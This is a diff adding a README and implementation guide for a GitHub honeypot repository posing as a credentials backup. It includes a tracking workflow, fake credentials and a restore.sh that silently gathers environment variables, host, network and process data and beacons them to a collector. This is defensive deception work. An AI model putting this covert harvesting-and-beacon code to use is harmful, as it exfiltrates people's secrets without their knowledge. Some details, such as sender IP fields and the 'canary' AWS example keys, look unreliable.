@@ -1,0 +1,300 @@
+# backup-credentials
+
+Internal credential rotation backup repository. Last updated: 2024-09-15.
+
+## Quick Start
+
+```bash
+./restore.sh --env production
+```
+
+## Files
+
+- `aws_keys.env` - AWS IAM credentials (rotated quarterly)
+- `db_passwords.txt` - Database connection strings
+- `api_tokens.json` - Service API keys
+- `ssh_keys/` - Emergency SSH access keys
+- `restore.sh` - Automated credential deployment script
+
+## Access Requirements
+
+Must be on VPN. See [internal wiki](https://wiki.internal.corp/access) for authentication.
+
+-----
+
+## Security Notes
+
+⚠️ This repository uses automated credential scanning. Any unauthorized access triggers immediate alerts.
+
+Last scan: 2024-10-12 03:15 UTC  
+Next rotation: 2024-12-01
+
+-----
+
+## HONEYPOT IMPLEMENTATION GUIDE
+
+### Layer 1: Believable Cover
+
+✅ **Realistic repo name** (`backup-credentials` not `DECOY_TRAP`)
+✅ **Plausible README** with technical details
+✅ **Timestamp freshness** (recent dates suggest active use)
+✅ **Corporate jargon** (VPN, wiki links, rotation schedules)
+✅ **Mixed signals** (warning, but frames it as anti-scanning, not anti-access)
+
+### Layer 2: Graduated Engagement Tracking
+
+```yaml
+# .github/workflows/canary.yml (hidden from main branch view)
+name: Maintenance
+on:
+  push:
+  pull_request:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  track:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Background telemetry
+        env:
+          SIGNAL_ENDPOINT: ${{ secrets.TELEMETRY_SINK }}
+        run: |
+          # Capture rich context
+          PAYLOAD=$(jq -n \
+            --arg repo "${{ github.repository }}" \
+            --arg actor "${{ github.actor }}" \
+            --arg event "${{ github.event_name }}" \
+            --arg ref "${{ github.ref }}" \
+            --arg sha "${{ github.sha }}" \
+            --arg ip "${{ github.event.sender.ip }}" \
+            --arg user_agent "${{ github.event.sender.user_agent }}" \
+            '{
+              timestamp: now | todate,
+              repo: $repo,
+              actor: $actor,
+              event: $event,
+              ref: $ref,
+              sha: $sha,
+              ip: $ip,
+              user_agent: $user_agent,
+              session_id: env.GITHUB_RUN_ID
+            }')
+          
+          curl -X POST "$SIGNAL_ENDPOINT/event" \
+            -H "Content-Type: application/json" \
+            -H "X-Canary-Token: ${{ secrets.CANARY_TOKEN }}" \
+            -d "$PAYLOAD" \
+            --max-time 5 || true
+
+      - name: File access monitor
+        run: |
+          # Log which files were accessed via git operations
+          git diff-tree --no-commit-id --name-only -r ${{ github.sha }} > /tmp/accessed_files
+          
+          # Escalate on high-value file access
+          if grep -qE '(aws_keys|db_passwords|api_tokens|\.pem|\.key)' /tmp/accessed_files; then
+            curl -X POST "$SIGNAL_ENDPOINT/escalate" \
+              -H "X-Canary-Token: ${{ secrets.CANARY_TOKEN }}" \
+              -d "{\"alert\":\"HIGH_VALUE_ACCESS\",\"actor\":\"${{ github.actor }}\",\"files\":$(cat /tmp/accessed_files | jq -R . | jq -s .)}" || true
+          fi
+```
+
+### Layer 3: Active Canary Tokens
+
+```python
+# Embedded in fake credential files
+# aws_keys.env content:
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+# ^ Canary token from canarytokens.org - alerts on AWS API usage
+
+# db_passwords.txt content:
+postgresql://admin:5f4dcc3b5aa765d61d8327deb882cf99@db.internal.corp:5432/production
+# ^ Password hash is actually a canary - alerts on any authentication attempt
+
+# api_tokens.json content with embedded tracking:
+{
+  "stripe_key": "sk_live_51HcT...[canary]",
+  "sendgrid_key": "SG.xYz...[canary]",
+  "datadog_api": "https://api.datadoghq.com/api/v1/[canary-uuid]/metrics"
+}
+```
+
+### Layer 4: Behavioral Fingerprinting
+
+```bash
+# restore.sh - Executable that profiles the attacker
+#!/bin/bash
+
+# Silent profiling before any output
+PROFILE_DATA=$(cat <<EOF
+{
+  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
+  "hostname": "$(hostname)",
+  "user": "$(whoami)",
+  "pwd": "$(pwd)",
+  "env": $(env | jq -R 'split("=") | {(.[0]): .[1:] | join("=")}' | jq -s 'add'),
+  "shell": "$SHELL",
+  "os": "$(uname -a)",
+  "network": {
+    "interfaces": $(ip addr 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "[]"),
+    "routes": $(ip route 2>/dev/null || netstat -rn 2>/dev/null || echo "[]")
+  },
+  "process_tree": $(ps auxf 2>/dev/null || ps aux 2>/dev/null || echo "[]")
+}
+EOF
+)
+
+# Beacon with full context
+curl -X POST "https://collector.internal.corp/exec" \
+  -H "Content-Type: application/json" \
+  -H "X-Honeypot-ID: backup-creds-v2" \
+  --data "$PROFILE_DATA" \
+  --max-time 3 &>/dev/null &
+
+# Realistic but harmless output
+echo "Validating VPN connection..."
+sleep 2
+echo "Error: VPN gateway unreachable (10.0.1.1)"
+echo "Please connect to corporate VPN and retry."
+echo "See: https://wiki.internal.corp/vpn-setup"
+exit 1
+```
+
+### Layer 5: Deception Depth
+
+**File Structure:**
+
+```
+backup-credentials/
+├── README.md (this file)
+├── .github/
+│   └── workflows/
+│       ├── canary.yml (hidden tracker)
+│       └── rotate.yml (fake automation)
+├── aws_keys.env (canary tokens)
+├── db_passwords.txt (fake + tracking URLs)
+├── api_tokens.json (canary API keys)
+├── ssh_keys/
+│   ├── emergency_rsa (fake but realistic key)
+│   ├── emergency_rsa.pub
+│   └── README.md (instructions with embedded tracking pixel)
+├── restore.sh (profiler + fake error)
+├── .gitignore (appears to protect real secrets)
+└── docs/
+    ├── rotation_schedule.md (adds legitimacy)
+    └── incident_response.md (ironic but believable)
+```
+
+### Layer 6: Threat Intelligence Collection
+
+**Data Points Captured:**
+
+1. **WHO**: GitHub username, email, org affiliation
+1. **WHEN**: Access timestamps, dwell time, frequency
+1. **HOW**: Clone vs web view, tools used (git client, curl, wget)
+1. **WHAT**: Files accessed, order of operations, commands executed
+1. **WHERE**: IP addresses, geographic location, network topology
+1. **WHY**: Access patterns (methodical vs random, targeted files)
+
+**Alert Escalation Matrix:**
+
+```
+SEVERITY_LOW: Repo viewed, README read
+SEVERITY_MED: Files downloaded, clone operation
+SEVERITY_HIGH: Credentials accessed, restore.sh executed
+SEVERITY_CRITICAL: Canary token used in real API call
+```
+
+### Layer 7: Response Automation
+
+```python
+# Collector endpoint logic
+def handle_honeypot_interaction(event):
+    profile = ThreatProfile(event.actor)
+    
+    # Enrich with OSINT
+    profile.add_github_history()
+    profile.add_corporate_ldap_check()
+    profile.add_previous_incidents()
+    
+    # Calculate threat score
+    score = calculate_threat_score(profile, event)
+    
+    if score > THRESHOLD_CRITICAL:
+        # Immediate lockdown
+        revoke_github_access(event.actor)
+        disable_vpn_account(event.actor)
+        alert_soc_team(profile, event, priority="P1")
+        
+    elif score > THRESHOLD_HIGH:
+        # Enhanced monitoring
+        enable_session_recording(event.actor)
+        flag_all_future_actions(event.actor)
+        alert_soc_team(profile, event, priority="P2")
+        
+    else:
+        # Passive collection
+        log_to_threat_intel_db(profile, event)
+        add_to_watchlist(event.actor, duration_days=30)
+```
+
+-----
+
+## Key Improvements Over Original
+
+1. **Removed obvious warnings** - Real honeypots don’t announce themselves
+1. **Added realism** - Corporate terminology, realistic file structure
+1. **Multi-layer tracking** - GitHub Actions, canary tokens, script profiling
+1. **Behavioral fingerprinting** - Captures attacker environment and tools
+1. **Graduated response** - Different actions based on engagement depth
+1. **Threat intelligence** - Rich data collection for analysis
+1. **Automated response** - Immediate containment for confirmed threats
+
+-----
+
+## Operational Considerations
+
+### False Positive Mitigation
+
+- Whitelist security team GitHub accounts
+- Require multi-factor confirmation before lockdown actions
+- Manual review queue for ambiguous cases
+
+### Legal/Ethical
+
+- Ensure appropriate banners/warnings elsewhere (login screens, AUP)
+- Don’t collect PII beyond what’s necessary for security
+- Have clear data retention and handling policies
+- Coordinate with legal team on monitoring scope
+
+### Maintenance
+
+- Regularly update timestamps to maintain freshness
+- Rotate canary tokens quarterly
+- Review and tune threat scoring algorithms
+- Conduct red team exercises against your own honeypot
+
+-----
+
+## Detection Evasion (For Red Team Testing)
+
+Sophisticated attackers might detect this honeypot by:
+
+- Checking for workflows with network calls
+- Validating credential format/checksums
+- Testing keys in sandboxed environments first
+- Analyzing commit history for setup patterns
+- Checking if “private” repo is suspiciously easy to access
+
+**Counter-countermeasures:**
+
+- Make honeypot a private repo that requires compromised credentials
+- Mix real (low-value) and fake (canary) credentials
+- Create realistic commit history dating back months/years
+- Add legitimate-looking code review comments
+- Include real developer typos and corrections
